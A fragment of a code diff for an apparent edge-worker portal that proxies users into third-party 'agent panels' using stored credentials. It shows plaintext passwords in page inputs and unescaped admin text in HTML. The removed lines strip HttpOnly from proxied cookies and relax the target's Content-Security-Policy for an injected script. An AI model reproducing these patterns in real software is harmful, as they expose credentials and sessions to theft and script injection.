+                                    <textarea oninput="uNotif('text',this.value)" placeholder="Enter notice..." class="w-full bg-black/50 border border-white/10 p-3 text-xs mb-3 outline-none min-h-[80px] focus:border-indigo-500 custom-scrollbar">\${n.text||''}</textarea>
+                                    <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Image URL (Optional)</label>
+                                    <input value="\${n.image||''}" oninput="uNotif('image',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-3 text-xs mb-3 outline-none focus:border-indigo-500">
+                                    <div class="flex gap-3">
+                                        <div class="w-1/2">
+                                            <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Btn Text</label>
+                                            <input value="\${n.btnText||''}" oninput="uNotif('btnText',this.value)" placeholder="JOIN NOW" class="w-full bg-black/50 border border-white/10 p-3 text-xs outline-none focus:border-indigo-500">
+                                        </div>
+                                        <div class="w-1/2">
+                                            <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Btn Link</label>
+                                            <input value="\${n.btnLink||''}" oninput="uNotif('btnLink',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-3 text-xs outline-none focus:border-indigo-500">
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>\`;
                         }
                         document.getElementById('app').innerHTML = html;
                     }
                     load();
                 </script>
-                <!-- Add Account Form Modal -->
-                <div id="add-account-form" class="hidden fixed inset-0 z-[200] flex items-center justify-center bg-black/80 backdrop-blur-md">
-                    <div class="bg-[#0a0a0a] border border-white/10 p-6 max-w-sm w-full mx-4 shadow-2xl flex flex-col">
-                        <h3 class="text-white font-bold tracking-widest mb-4 uppercase text-sm flex items-center gap-2">
-                            <svg class="w-4 h-4 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"></path></svg>
-                            Add Another Account
-                        </h3>
-                        <div class="space-y-3">
-                            <div>
-                                <label class="text-[8px] uppercase tracking-widest text-gray-500 mb-1 block">Username</label>
-                                <input type="text" id="acc-username" placeholder="Enter username..." class="w-full bg-black border border-white/10 p-3 text-xs text-white outline-none focus:border-indigo-500">
-                            </div>
-                            <div>
-                                <label class="text-[8px] uppercase tracking-widest text-gray-500 mb-1 block">Password</label>
-                                <input type="text" id="acc-password" placeholder="Enter password..." class="w-full bg-black border border-white/10 p-3 text-xs text-white outline-none focus:border-indigo-500">
-                            </div>
-                            <div>
-                                <label class="text-[8px] uppercase tracking-widest text-gray-500 mb-1 block">Role</label>
-                                <select id="acc-role" class="square-select w-full bg-black border border-white/10 p-3 text-xs text-gray-300 outline-none focus:border-indigo-500">
-                                    <option value="Admin">Admin</option>
-                                    <option value="Super Agent">Super Agent</option>
-                                    <option value="Master Agent">Master Agent</option>
-                                </select>
-                            </div>
-                        </div>
-                        <div class="flex gap-3 justify-end mt-6">
-                            <button onclick="cancelAddAccount()" class="px-5 py-2.5 bg-white/5 hover:bg-white/10 text-gray-300 text-[10px] font-bold uppercase tracking-widest transition border border-white/5">Cancel</button>
-                            <button onclick="confirmAddAccount()" class="px-6 py-2.5 bg-indigo-600 text-white hover:bg-indigo-500 text-[10px] font-bold uppercase tracking-widest transition shadow-[0_0_15px_rgba(99,102,241,0.4)]">Add Account</button>
-                        </div>
-                    </div>
-                </div>
             </body>
             </html>`;
             return new Response(adminHTML, { headers: { "Content-Type": "text/html" } });
@@ -647,6 +592,7 @@ export default {
         // --- 💻 USER DASHBOARD & PROXY INIT ---
         if (path === "/dashboard") {
             if (!isUser) return Response.redirect(url.origin, 302);
+            
             const userData = db.pins[userPin];
             let sitesHTML = '';
 
@@ -654,85 +600,78 @@ export default {
                 userData.sites.forEach(siteId => {
                     const site = db.sites[siteId];
                     if (!site) return;
+                    
                     const isSuspended = userData.status === 'suspended';
                     const statusText = isSuspended ? 'Suspended' : 'Active';
                     const statusColor = isSuspended ? 'text-red-400 border-red-400/20 bg-red-400/10' : 'text-green-400 border-green-400/20 bg-green-400/10';
+                    
                     const siteConf = userData.siteConf?.[siteId] || { u: '', r: 'Admin', p: '' };
-                    const additionalAccounts = siteConf.additionalAccounts || [];
+                    let roleColor = siteConf.r === 'Admin' ? 'text-purple-400 border-purple-400/20 bg-purple-400/10' : 
+                                    siteConf.r === 'Super Agent' ? 'text-blue-400 border-blue-400/20 bg-blue-400/10' : 
+                                    'text-yellow-400 border-yellow-400/20 bg-yellow-400/10';
 
-                    // Main account connect button
                     const hasPwd = siteConf.p && siteConf.p.trim() !== '';
-                    const mainLoginAction = hasPwd ? `window.location.href='/api/start-proxy?id=${siteId}'` : `CustomModal.show({type:'alert', title:'<span class=\\'text-red-500\\'>⚠</span> Password Required', text:'Setup panel password first.'})`;
-                    const mainConnectBtn = isSuspended ? `<button disabled class="w-full py-4 bg-white/5 text-gray-500 text-[10px] font-bold uppercase tracking-[0.2em] cursor-not-allowed border border-white/5 mt-4">Suspended</button>` : `<button onclick="${mainLoginAction}" class="w-full py-4 bg-white text-black text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-gray-200 transition-colors flex items-center justify-center gap-2 mt-4"><span>Login Agent Panel</span><svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg></button>`;
+                    const safeSiteName = (site.name || 'this site').replace(/'/g, "\\'").replace(/"/g, '&quot;');
+                    
+                    const loginAction = hasPwd 
+                        ? `window.location.href='/api/start-proxy?id=${siteId}'` 
+                        : `CustomModal.show({type:'alert', title:'<span class=\\'text-red-500\\'>⚠</span> Password Required', text:'Please setup your panel password for <b>${safeSiteName}</b> before logging in.'})`;
 
-                    // Additional accounts HTML
-                    let additionalAccountsHTML = '';
-                    if (additionalAccounts.length > 0) {
-                        additionalAccountsHTML = additionalAccounts.map((acc, idx) => {
-                            let accRoleColor = acc.role === 'Admin' ? 'text-purple-400 border-purple-400/20 bg-purple-400/10' : acc.role === 'Super Agent' ? 'text-blue-400 border-blue-400/20 bg-blue-400/10' : 'text-yellow-400 border-yellow-400/20 bg-yellow-400/10';
-                            const accLoginAction = `window.location.href='/api/start-proxy?id=${siteId}&accIdx=${idx}'`;
-                            return `
-                            <div class="bg-[#0a0a0a] border border-white/10 p-3 mt-2">
-                                <div class="flex justify-between items-center mb-2">
-                                    <span class="text-[8px] font-bold uppercase tracking-widest px-2 py-0.5 border ${accRoleColor}">${acc.role}</span>
-                                </div>
-                                <div class="space-y-1.5">
-                                    <div class="bg-white/5 border border-white/10 flex items-center p-1.5">
-                                        <span class="text-[8px] font-bold text-gray-500 uppercase px-2 w-[55px]">User</span>
-                                        <input type="text" readonly value="${acc.username}" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate select-all">
-                                    </div>
-                                    <div class="bg-white/5 border border-white/10 flex items-center p-1.5">
-                                        <span class="text-[8px] font-bold text-gray-500 uppercase px-2 w-[55px]">Pass</span>
-                                        <input type="text" readonly value="${acc.password}" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate select-all" style="-webkit-text-security: disc; font-family: text-security-disc, sans-serif;">
-                                    </div>
-                                </div>
-                                <button onclick="${accLoginAction}" class="w-full py-3 bg-indigo-600/80 text-white text-[9px] font-bold uppercase tracking-widest hover:bg-indigo-500 transition mt-2 ${isSuspended ? 'opacity-50 cursor-not-allowed' : ''}" ${isSuspended ? 'disabled' : ''}>Login This Account</button>
-                            </div>`;
-                        }).join('');
-                    }
+                    const connectBtn = isSuspended 
+                        ? `<button disabled class="w-full py-4 bg-white/5 text-gray-500 text-[10px] font-bold uppercase tracking-[0.2em] cursor-not-allowed border border-white/5 mt-4">Suspended</button>`
+                        : `<button onclick="${loginAction}" class="w-full py-4 bg-white text-black text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-gray-200 transition-colors flex items-center justify-center gap-2 mt-4 shadow-[0_0_15px_rgba(255,255,255,0.1)] outline-none"><span>Login Your Panel</span><svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg></button>`;
 
                     sitesHTML += `
                     <div class="border border-white/5 bg-[#0a0a0a] p-5 flex flex-col justify-between ${isSuspended ? 'opacity-60 grayscale' : ''}">
                         <div class="flex justify-between items-start mb-4">
                             <div class="flex items-center gap-2">
+                                <span class="text-[8px] font-bold uppercase tracking-widest px-2 py-1 border ${roleColor}">${siteConf.r}</span>
                                 <span class="text-[8px] font-bold uppercase tracking-widest px-2 py-1 border ${statusColor}">${statusText}</span>
                             </div>
                             <div class="w-8 h-8 bg-white/5 border border-white/10 flex items-center justify-center"><svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"></path></svg></div>
                         </div>
+                        
                         <div class="flex-grow">
                             <h2 class="text-xl font-bold text-white tracking-wide truncate mb-3">${site.name || 'Unnamed Site'}</h2>
+                            
                             <button onclick="toggleDetails('${siteId}')" class="flex items-center gap-2 text-[9px] font-bold text-gray-400 hover:text-white uppercase tracking-widest transition mb-2 group outline-none">
                                 <svg id="arrow-${siteId}" class="w-3 h-3 transition-transform duration-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>
-                                View Panel Details (${1 + additionalAccounts.length} Accounts)
+                                View Panel Details
                             </button>
+                            
                             <div id="details-${siteId}" class="hidden mt-3 space-y-2 p-3 bg-black/40 border border-white/5">
-                                <div class="bg-[#0a0a0a] border border-white/10 p-3">
-                                    <span class="text-[8px] font-bold uppercase tracking-widest px-2 py-0.5 border text-purple-400 border-purple-400/20 bg-purple-400/10 inline-block mb-2">${siteConf.r || 'Admin'}</span>
-                                    <div class="space-y-1.5">
-                                        <div class="bg-white/5 border border-white/10 flex items-center p-1.5">
-                                            <span class="text-[8px] font-bold text-gray-500 uppercase px-2 w-[55px]">User</span>
-                                            <input type="text" readonly value="${siteConf.u}" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate select-all">
-                                        </div>
-                                        <div class="bg-white/5 border border-white/10 flex items-center p-1.5 relative">
-                                            <span class="text-[8px] font-bold text-gray-500 uppercase px-2 w-[55px]">Pass</span>
-                                            <input type="text" readonly value="${siteConf.p || ''}" id="pwd-disp-${siteId}" autocomplete="new-password" data-lpignore="true" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate" style="-webkit-text-security: disc; font-family: text-security-disc, sans-serif;">
-                                            <div class="flex gap-1 flex-shrink-0">
-                                                <button onclick="copyLink(document.getElementById('pwd-disp-${siteId}').value, this)" class="w-7 h-7 flex items-center justify-center bg-white/10 hover:bg-white/20">
-                                                    <svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
-                                                </button>
-                                                <button onclick="toggleEditPwd('${siteId}')" class="h-7 px-3 bg-indigo-500/20 text-indigo-400 hover:bg-indigo-500/40 border border-indigo-500/30 text-[8px] font-bold uppercase tracking-widest">Edit</button>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div id="pwd-edit-${siteId}" class="hidden mt-2 flex gap-2 pt-2 border-t border-white/10">
-                                        <input type="text" id="pwd-in-${siteId}" autocomplete="new-password" placeholder="New password..." class="flex-grow bg-black/50 border border-white/10 p-2 text-xs text-white outline-none focus:border-indigo-500">
-                                        <button onclick="savePwd('${siteId}')" class="px-4 bg-indigo-600/20 text-indigo-400 border border-indigo-500/50 hover:bg-indigo-600 hover:text-white text-[9px] font-bold uppercase tracking-widest">Save</button>
+                                <div class="bg-white/5 border border-white/10 flex items-center p-1.5 w-full">
+                                    <span class="text-[8px] font-bold text-gray-500 uppercase px-2 whitespace-nowrap w-[60px]">Username</span>
+                                    <input type="text" readonly value="${siteConf.u}" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate select-all">
+                                </div>
+                                
+                                <div class="bg-white/5 border border-white/10 flex items-center p-1.5 w-full mt-2 relative">
+                                    <span class="text-[8px] font-bold text-gray-500 uppercase px-2 whitespace-nowrap w-[60px]">Password</span>
+                                    <input type="text" readonly value="${siteConf.p || ''}" id="pwd-disp-${siteId}" autocomplete="new-password" data-lpignore="true" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate" style="-webkit-text-security: disc; font-family: text-security-disc, sans-serif;">
+                                    <div class="flex gap-1 flex-shrink-0">
+                                        <button onclick="copyLink(document.getElementById('pwd-disp-${siteId}').value, this)" class="w-7 h-7 flex items-center justify-center bg-white/10 hover:bg-white/20 transition-colors">
+                                            <svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                                        </button>
+                                        <button onclick="toggleEditPwd('${siteId}')" class="h-7 px-3 bg-indigo-500/20 text-indigo-400 hover:bg-indigo-500/40 transition border border-indigo-500/30 text-[8px] font-bold uppercase tracking-widest whitespace-nowrap">Update</button>
                                     </div>
                                 </div>
-                                ${additionalAccountsHTML}
+                                <div id="pwd-edit-${siteId}" class="hidden mt-2 flex gap-2 pt-2 border-t border-white/10">
+                                    <input type="text" id="pwd-in-${siteId}" autocomplete="new-password" placeholder="Type new password..." class="flex-grow bg-black/50 border border-white/10 p-2 text-xs text-white outline-none focus:border-indigo-500">
+                                    <button onclick="savePwd('${siteId}')" class="px-4 bg-indigo-600/20 text-indigo-400 border border-indigo-500/50 hover:bg-indigo-600 hover:text-white transition text-[9px] font-bold uppercase tracking-widest">Save</button>
+                                </div>
+
+                                <div class="bg-white/5 border border-white/10 flex items-center p-1.5 w-full mt-2">
+                                    <span class="text-[8px] font-bold text-gray-500 uppercase px-2 whitespace-nowrap w-[60px]">Link</span>
+                                    <input type="text" readonly value="${site.userLink}" class="flex-grow bg-transparent text-[11px] text-blue-400 px-2 outline-none min-w-0 truncate select-all">
+                                    <div class="flex-shrink-0">
+                                        <button onclick="copyLink('${site.userLink}', this)" class="w-7 h-7 flex items-center justify-center bg-white/10 hover:bg-white/20 transition-colors">
+                                            <svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                                        </button>
+                                    </div>
+                                </div>
                             </div>
                         </div>
-                        ${mainConnectBtn}
+                        ${connectBtn}
                     </div>`;
                 });
             } else {
@@ -741,7 +680,13 @@ export default {
 
             let waHTML = '';
             if (db.settings.whatsapp) {
-                waHTML = `<div class="fixed bottom-6 right-6 z-40 flex items-center justify-center group cursor-pointer" onclick="window.open('https://wa.me/${db.settings.whatsapp.replace(/[^0-9]/g, '')}', '_blank')"><div class="absolute w-14 h-14 bg-green-500 rounded-full animate-ping opacity-60"></div><div class="relative w-14 h-14 bg-green-500 rounded-full flex items-center justify-center shadow-lg group-hover:scale-110 transition duration-300"><svg class="w-7 h-7 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12.031 0C5.385 0 0 5.385 0 12.031c0 2.12.55 4.195 1.597 6.012L.15 24l6.104-1.602a11.96 11.96 0 005.777 1.488h.005c6.645 0 12.031-5.385 12.031-12.031S18.676 0 12.031 0z"/></svg></div></div>`;
+                waHTML = `
+                <div class="fixed bottom-6 right-6 z-40 flex items-center justify-center group cursor-pointer" onclick="window.open('https://wa.me/${db.settings.whatsapp.replace(/[^0-9]/g, '')}', '_blank')">
+                    <div class="absolute w-14 h-14 bg-green-500 rounded-full animate-ping opacity-60"></div>
+                    <div class="relative w-14 h-14 bg-green-500 rounded-full flex items-center justify-center shadow-lg group-hover:scale-110 transition duration-300">
+                        <svg class="w-7 h-7 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12.031 0C5.385 0 0 5.385 0 12.031c0 2.12.55 4.195 1.597 6.012L.15 24l6.104-1.602a11.96 11.96 0 005.777 1.488h.005c6.645 0 12.031-5.385 12.031-12.031S18.676 0 12.031 0zm0 21.884c-1.785 0-3.535-.48-5.07-1.386l-.364-.215-3.766.988.996-3.668-.236-.376a9.998 9.998 0 01-1.528-5.342c0-5.523 4.494-10.017 10.017-10.017 5.522 0 10.016 4.494 10.016 10.017 0 5.523-4.494 10.017-10.016 10.017zm5.503-7.518c-.302-.152-1.785-.882-2.062-.982-.277-.101-.48-.152-.682.152-.202.302-.782.982-.958 1.183-.176.202-.353.227-.655.075-1.677-.822-2.825-1.73-3.92-3.623-.177-.303.176-.277.625-1.182.075-.152.038-.278-.038-.429-.075-.152-.682-1.642-.934-2.247-.245-.588-.496-.51-.682-.52h-.58c-.202 0-.53.076-.807.378-.277.303-1.06 1.035-1.06 2.525s1.085 2.928 1.236 3.13c.151.202 2.133 3.257 5.17 4.57 1.956.845 2.76.907 3.754.764.935-.136 2.875-1.176 3.279-2.311.404-1.136.404-2.108.277-2.311-.126-.203-.454-.303-.757-.454z"></path></svg>
+                    </div>
+                </div>`;
             }
 
             let notifHTML = '';
@@ -751,16 +696,69 @@ export default {
                 if (n.target === 'all') showNotif = true;
                 else if (n.target === 'specific' && n.specificUsers && n.specificUsers.includes(userPin)) showNotif = true;
             }
+
             if (showNotif) {
-                notifHTML = `<div id="notif-modal" class="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 backdrop-blur-md"><div class="bg-[#0a0a0a] border border-white/10 p-6 max-w-sm w-full mx-4 relative shadow-2xl"><button onclick="document.getElementById('notif-modal').remove()" class="absolute top-3 right-3 text-gray-500 hover:text-white"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg></button>${n.image ? `<img src="${n.image}" class="w-full h-32 object-cover mb-4 border border-white/5">` : ''}<h3 class="text-white font-bold tracking-wide mb-2 uppercase text-sm">Notice</h3><p class="text-gray-400 text-xs mb-6 whitespace-pre-wrap">${n.text}</p>${(n.btnText && n.btnLink) ? `<a href="${n.btnLink}" target="_blank" class="block w-full text-center bg-white hover:bg-gray-200 text-black py-3 text-[10px] font-bold uppercase tracking-widest">${n.btnText}</a>` : ''}</div></div>`;
+                notifHTML = `
+                <div id="notif-modal" class="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 backdrop-blur-md">
+                    <div class="bg-[#0a0a0a] border border-white/10 p-6 max-w-sm w-full mx-4 relative shadow-2xl">
+                        <button onclick="document.getElementById('notif-modal').remove()" class="absolute top-3 right-3 text-gray-500 hover:text-white"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg></button>
+                        ${n.image ? `<img src="${n.image}" class="w-full h-32 object-cover mb-4 border border-white/5">` : ''}
+                        <h3 class="text-white font-bold tracking-wide mb-2 uppercase text-sm flex items-center gap-2"><svg class="w-4 h-4 text-indigo-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg> System Notice</h3>
+                        <p class="text-gray-400 text-xs mb-6 leading-relaxed whitespace-pre-wrap">${n.text}</p>
+                        ${(n.btnText && n.btnLink) ? `<a href="${n.btnLink}" target="_blank" class="block w-full text-center bg-white hover:bg-gray-200 transition text-black py-3 text-[10px] font-bold uppercase tracking-widest">${n.btnText}</a>` : ''}
+                    </div>
+                </div>`;
             }
 
-            const html = `<!DOCTYPE html><html lang="en" class="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Core | Portal</title><script src="https://cdn.tailwindcss.com"><\/script><style>body { background-color: #030303; color: white; font-family: 'Inter', sans-serif; }</style></head><body class="pb-20">${customModalScript} ${notifHTML} ${waHTML}<header class="sticky top-0 z-40 flex justify-between items-center border-b border-white/10 bg-[#0a0a0a] p-4 md:p-6 shadow-md w-full"><div><h1 class="text-lg md:text-xl font-bold tracking-widest uppercase text-indigo-400">Welcome <span class="text-white">${userData.name || userPin}</span></h1></div><a href="/logout" class="px-5 py-2.5 bg-red-900/20 text-[10px] font-bold tracking-widest uppercase border border-red-900/50 text-red-500 hover:bg-red-600 hover:text-white transition">Terminate</a></header><div class="max-w-6xl mx-auto p-4 md:p-8"><h3 class="text-[9px] font-bold uppercase tracking-[0.2em] text-gray-500 mb-4 border-b border-white/10 pb-2">Your Environments</h3><div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">${sitesHTML}</div></div><script>
-                function copyLink(text, btn) { if(!text) return; navigator.clipboard.writeText(text); const old = btn.innerHTML; btn.innerHTML = '<svg class="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>'; setTimeout(() => btn.innerHTML = old, 1500); }
-                function toggleDetails(id) { const el = document.getElementById('details-' + id), arrow = document.getElementById('arrow-' + id); if(el.classList.contains('hidden')) { el.classList.remove('hidden'); arrow.classList.add('rotate-90'); } else { el.classList.add('hidden'); arrow.classList.remove('rotate-90'); } }
-                function toggleEditPwd(id) { document.getElementById('pwd-edit-' + id).classList.toggle('hidden'); }
-                async function savePwd(siteId) { const pwd = document.getElementById('pwd-in-' + siteId).value; if(!pwd) return CustomModal.show({type:'alert', title:'<span class="text-red-500">⚠</span> Error', text:'Password cannot be empty!'}); try { const res = await fetch('/api/update-password', { method: 'POST', body: JSON.stringify({ siteId, newPassword: pwd }) }); if(res.ok) { document.getElementById('pwd-disp-' + siteId).value = pwd; document.getElementById('pwd-edit-' + siteId).classList.add('hidden'); CustomModal.show({type:'alert', title:'<span class="text-green-500">✔</span> Success', text:'Updated!'}); } } catch(e) {} }
-            </script></body></html>`;
+            const html = `<!DOCTYPE html><html lang="en" class="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Core | Portal</title><script src="https://cdn.tailwindcss.com"></script>
+            <style>body { background-color: #030303; color: white; font-family: 'Inter', sans-serif; }</style></head>
+            <body class="pb-20">
+                ${customModalScript} ${notifHTML} ${waHTML}
+                
+                <header class="sticky top-0 z-40 flex justify-between items-center border-b border-white/10 bg-[#0a0a0a] p-4 md:p-6 shadow-md w-full">
+                    <div>
+                        <h1 class="text-lg md:text-xl font-bold tracking-widest uppercase text-indigo-400">Welcome <span class="text-white">${userData.name || userPin}</span></h1>
+                        <p class="text-[9px] text-gray-500 mt-0.5 uppercase tracking-[0.2em]">Secure Access Identity</p>
+                    </div>
+                    <a href="/logout" class="px-5 py-2.5 bg-red-900/20 text-[10px] font-bold tracking-widest uppercase border border-red-900/50 text-red-500 hover:bg-red-600 hover:text-white transition">Terminate</a>
+                </header>
+
+                <div class="max-w-6xl mx-auto p-4 md:p-8">
+                    <h3 class="text-[9px] font-bold uppercase tracking-[0.2em] text-gray-500 mb-4 border-b border-white/10 pb-2">Your Environments</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">${sitesHTML}</div>
+                </div>
+                <script>
+                    function copyLink(text, btn) {
+                        if(!text) return;
+                        navigator.clipboard.writeText(text);
+                        const old = btn.innerHTML;
+                        btn.innerHTML = '<svg class="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>';
+                        setTimeout(() => btn.innerHTML = old, 1500);
+                    }
+                    function toggleDetails(id) {
+                        const el = document.getElementById('details-' + id), arrow = document.getElementById('arrow-' + id);
+                        if(el.classList.contains('hidden')) { el.classList.remove('hidden'); arrow.classList.add('rotate-90'); } 
+                        else { el.classList.add('hidden'); arrow.classList.remove('rotate-90'); }
+                    }
+                    function toggleEditPwd(id) {
+                        const el = document.getElementById('pwd-edit-' + id);
+                        el.classList.toggle('hidden');
+                    }
+                    async function savePwd(siteId) {
+                        const pwd = document.getElementById('pwd-in-' + siteId).value;
+                        if(!pwd) return CustomModal.show({type:'alert', title:'<span class="text-red-500">⚠</span> Error', text:'Password cannot be empty!'});
+                        
+                        try {
+                            const res = await fetch('/api/update-password', { method: 'POST', body: JSON.stringify({ siteId, newPassword: pwd }) });
+                            if(res.ok) {
+                                document.getElementById('pwd-disp-' + siteId).value = pwd;
+                                document.getElementById('pwd-edit-' + siteId).classList.add('hidden');
+                                CustomModal.show({type:'alert', title:'<span class="text-green-500">✔</span> Success', text:'Password Updated Successfully!'});
+                            }
+                        } catch(e) {}
+                    }
+                </script>
+            </body></html>`;
             return new Response(html, { headers: { "Content-Type": "text/html" } });
         }
 
@@ -768,25 +766,10 @@ export default {
         if (path === "/api/start-proxy") {
             if (!isUser) return new Response("Denied", { status: 403 });
             const siteId = url.searchParams.get("id");
-            const accIdx = url.searchParams.get("accIdx");
             const userData = db.pins[userPin];
             if (userData.status === 'suspended' || !userData.sites.includes(siteId) || !db.sites[siteId]) return new Response("Access Denied", { status: 403 });
             
-            let conf = userData.siteConf?.[siteId] || { u:'', r:'Admin', p:'' };
-            
-            // If accIdx provided, use additional account
-            if (accIdx !== null && accIdx !== undefined) {
-                const additionalAccounts = userData.siteConf?.[siteId]?.additionalAccounts || [];
-                const idx = parseInt(accIdx);
-                if (additionalAccounts[idx]) {
-                    conf = {
-                        u: additionalAccounts[idx].username,
-                        p: additionalAccounts[idx].password,
-                        r: additionalAccounts[idx].role || 'Admin'
-                    };
-                }
-            }
-
+            const conf = userData.siteConf?.[siteId] || {};
             const proxyData = JSON.stringify({ 
                 t: db.sites[siteId].agentLink, 
                 a: db.sites[siteId].apiLink || '', 
@@ -801,11 +784,13 @@ export default {
                 headers: { "Location": "/", "Set-Cookie": `proxy_active=${encryptedData}; HttpOnly; Secure; Path=/; Max-Age=3600; SameSite=Lax` }
             });
         }
+        if (path === "/api/stop-proxy") return new Response("Stopped", { status: 302, headers: { "Location": "/", "Set-Cookie": "proxy_active=; Max-Age=0; Path=/" } });
 
         // --- 🌐 GLOBAL PROXY ENGINE ---
         if (isUser && isProxyActive) {
             const proxyDataString = decrypt(isProxyActive);
             if(!proxyDataString) return new Response("Invalid Proxy", { status: 400 });
+            
             let proxyData;
             try { proxyData = JSON.parse(proxyDataString); } catch(e) { proxyData = { t: proxyDataString, a: '', b: '', u: '', p: '' }; }
 
@@ -825,9 +810,11 @@ export default {
                 const wsUrl = new URL(request.url);
                 wsUrl.hostname = tDomainObj.hostname;
                 wsUrl.protocol = tDomainObj.protocol === 'https:' ? 'wss:' : 'ws:';
+                
                 const wsHeaders = new Headers(request.headers);
                 wsHeaders.set("Host", tDomainObj.hostname);
                 wsHeaders.set("Origin", targetDomain);
+                
                 return fetch(new Request(wsUrl.toString(), request), { headers: wsHeaders });
             }
 
@@ -835,16 +822,11 @@ export default {
             proxyHeaders.set("Host", targetUrl.hostname);
             proxyHeaders.set("Origin", targetDomain);
             proxyHeaders.set("Referer", targetDomain + targetUrl.pathname);
-            proxyHeaders.delete("Accept-Encoding");
+            proxyHeaders.delete("Accept-Encoding"); 
 
-            // Keep cookies synced
-            const localCookies = Object.fromEntries((request.headers.get("Cookie") || "").split(';').map(c => {
-                const parts = c.split('='); return[parts[0].trim(), parts.slice(1).join('=')];
-            }));
-            delete localCookies['portal_session'];
-            delete localCookies['proxy_active'];
-            delete localCookies['admin_session'];
-            const cleanCookieStr = Object.entries(localCookies).map(([k, v]) => `${k}=${v}`).join('; ');
+            delete cookies['portal_session'];
+            delete cookies['proxy_active'];
+            const cleanCookieStr = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
             if (cleanCookieStr) proxyHeaders.set("Cookie", cleanCookieStr); else proxyHeaders.delete("Cookie");
 
             const fetchConfig = { method: request.method, headers: proxyHeaders, redirect: "manual" };
@@ -856,15 +838,7 @@ export default {
             for (const [key, value] of proxyRes.headers.entries()) {
                 if (key.toLowerCase() === 'set-cookie') {
                     let modCookie = value.replace(/Domain=[^;]+;?\s*/gi, '');
-                    // Remove HttpOnly from cookies so JS can access
-                    modCookie = modCookie.replace(/HttpOnly;?\s*/gi, '');
                     responseHeaders.append('Set-Cookie', modCookie);
-                } else if (key.toLowerCase() === 'content-security-policy') {
-                    // Relax CSP to allow our injected script
-                    let csp = value;
